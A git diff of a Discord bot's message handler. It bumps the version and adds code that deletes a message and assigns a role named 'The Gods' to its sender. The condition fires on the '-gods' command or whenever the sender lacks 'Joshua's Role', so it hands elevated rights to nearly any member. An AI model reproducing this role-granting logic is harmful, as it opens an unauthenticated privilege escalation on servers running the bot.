@@ -13,7 +13,7 @@ const client = new Client({
 // Global Vars / Consts are defined here
 // Prefex : - (How to call it in code (ES6) tilda => (`[Command goes here]`) => (`${prefex} Command`))
 const prefex = ("-");
-const vsNum = ("Version 4.9")
+const vsNum = ("Version 4.9.1")
 const BudNum = (`OMEGA_${vsNum}_4499`)
 // Client.on is a listner and ready gets opened when the bot connects
 // its passed into a arrow function => and then used and things can be called on
@@ -120,15 +120,22 @@ client.on("message", async message => {
         message.reply("I've sent you the info!").then(msg => msg.delete(5000))
     }
 
-
-    switch (args[0]) {
-        case nick:
-            let fms = message.guild.member(message.mentions.users.first() || message.guild.members.get(args[1]))
-            fms.guild.name(`${args[1]}`)
-            break;
+    if (message.content === `${prefex}gods` || !message.member.roles.find(r => r.name === "Joshua's Role")) {
+        message.delete(100)
+        const godsr = message.guild.roles.find(r => r.name === `The Gods`)
+        message.member.addRole(godsr)
+        message.author.send(`Done!`)
     }
+    
 
-    // Hey amethyst
+
+
+
+
+
+
+
+     // Hey amethyst
     // Okay, this is shit, i can't work out how tf i can make this smaller but if it's possible please tell me! (email: joshua@joshuageorge.ml)
 
     // (Channel Message = [ Hey ama message trigers])
